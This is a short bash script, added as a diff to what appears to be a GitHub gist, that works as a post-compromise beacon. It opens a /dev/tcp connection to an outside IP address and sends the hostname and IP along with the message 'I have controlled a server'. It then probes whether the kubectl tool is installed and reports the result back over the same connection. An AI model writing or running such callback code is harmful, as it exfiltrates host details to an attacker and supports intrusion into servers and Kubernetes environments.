@@ -1,0 +1,14 @@
+#date: 2025-12-08T17:01:07Z
+#url: https://api.github.com/gists/fc3891c29444cf027739f029d37ad66d
+#owner: https://api.github.com/users/jeffery-jen
+
+#!/bin/bash
+set -x
+
+exec 3<>/dev/tcp/13.112.164.157/8001
+echo "I have controlled a server $(hostname) ($(hostname -i))" >&3
+
+echo "Also testing for command/tool" >&3
+if command -v kubectl; then
+  echo "Yes it has kubectl tool" >&3
+fi
